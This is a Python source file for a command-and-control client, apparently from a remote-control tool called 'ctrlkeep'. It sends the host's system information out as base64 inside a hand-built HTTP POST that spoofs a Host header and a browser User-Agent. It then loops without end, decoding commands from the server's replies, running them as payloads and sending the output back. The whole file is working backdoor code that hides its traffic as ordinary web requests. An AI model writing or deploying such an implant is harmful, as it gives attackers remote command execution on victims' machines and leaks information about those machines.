import base64
import platform
import socket
from ctrlkeep.execmd import execpayload

def request(address, data):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(address)

    sendData = "POST /pushdata"
    sendData += "\r\n"
    sendData += "HTTP/1.1"
    sendData += "\r\n"
    sendData += "Host: tazxuo.com"
    sendData += "\r\n"
    sendData += "Connection: close"
    sendData += "\r\n"
    sendData += "Upgrade-Insecure-Requests: 1"
    sendData += "\r\n"
    sendData += "User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/32.13 (KHTML, like Gecko) Chrome/59.0.332.13 Safari/452.36"
    sendData += "\r\n"
    sendData += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
    sendData += "\r\n"
    sendData += "Accept-Language: en-US,en;q=0.9"
    sendData += "\r\n"
    sendData += "Accept-Encoding: gzip, deflate"
    sendData += "\r\n"
    sendData += "\r\n"
    sendData += "stri0date=%s" % data
    sendData += "\r\n"
    sendData += "\r\n"

    s.send(sendData.encode())

    read_bytes = bytes()
    while True:
        getData = s.recv(512)
        if not getData:
            break
        else:
            read_bytes += getData
            if read_bytes.find(b"\r\n\r\n") != -1 and read_bytes.find(b"_kHbBf7oL") != -1:
                break

    s.close()
    return read_bytes


def client():
    address = ('127.0.0.1', 80)
    data = str(platform.uname())

    # 编码/加密
    data = base64.b64encode(data.encode("utf-8")).decode()

    result = request(address, data)

    # 进入循环
    while True:
        # 处理数据
        result = result.decode()
        result = result[result.find("Connection: keep-alive\r\n\r\n") + 26: result.find("_kHbBf7oL")]

        # 解码/解密
        result = str(base64.b64decode(result), "utf-8")

        # 执行payload
        if result is not None and result != '':
            print("准备执行:", result)

            data = execpayload.execpayload().exec_cmd(result)
        else:
            data = ''

        # 编码/加密
        data = base64.b64encode(data.encode("utf-8")).decode()

        result = request(address, data)



if __name__ == '__main__':
    client()